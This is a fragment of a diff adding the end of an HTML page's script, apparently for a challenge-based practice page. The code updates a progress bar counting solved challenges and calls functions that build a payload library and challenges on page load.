+  const pct = (solved.size / CHALLENGES.length) * 100;
+  document.getElementById('progressBar').style.width  = pct + '%';
+  document.getElementById('progressLabel').textContent = `${solved.size} / ${CHALLENGES.length} solved`;
+}
+
+/* ═══ INIT ═══ */
+document.addEventListener('DOMContentLoaded', function() {
+  buildPayloadLibrary();
+  buildChallenges();
+  simulateResponse();
+});
+</script>
+</body>
+</html>
